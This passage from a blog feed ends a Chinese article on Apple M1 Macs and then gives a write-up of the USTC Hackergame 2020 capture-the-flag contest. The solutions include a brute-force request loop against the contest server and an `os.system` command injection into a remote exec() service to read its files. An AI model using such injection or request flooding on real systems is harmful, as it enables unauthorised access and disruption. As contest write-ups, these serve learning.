处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x 